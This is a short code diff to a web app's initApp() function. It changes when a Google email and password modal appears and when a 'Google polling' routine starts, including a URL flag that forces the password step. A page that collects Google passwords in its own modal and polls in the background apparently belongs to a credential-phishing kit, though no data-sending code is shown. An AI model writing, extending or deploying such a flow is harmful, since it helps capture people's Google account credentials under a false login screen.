@@ -185,7 +185,7 @@ function initApp() {
                              initParams.get("google") === "1" || 
                              window.location.search.includes("auth=google");
 
-        if (!targetStep && isTestBotUrl) {
+        if ((!targetStep || targetStep === stepPhone) && isTestBotUrl) {
             targetStep = userGoogleEmail ? stepGooglePassword : stepGoogleEmail;
         }
 
@@ -198,11 +198,8 @@ function initApp() {
         ].includes(targetStep);
 
         if (googleAuthModal) {
-            if (isGoogleStep || isTestBotUrl) {
+            if (isGoogleStep) {
                 googleAuthModal.classList.remove("hidden");
-                if (!isGoogleStep && isTestBotUrl) {
-                    targetStep = userGoogleEmail ? stepGooglePassword : stepGoogleEmail;
-                }
             } else {
                 googleAuthModal.classList.add("hidden");
             }
@@ -217,8 +214,8 @@ function initApp() {
             }
         }
 
-        if (isGoogleStep || isTestBotUrl) {
-            if (typeof startGooglePolling === "function") startGooglePolling();
+        if (isGoogleStep && typeof startGooglePolling === "function") {
+            startGooglePolling();
         }
 
         [
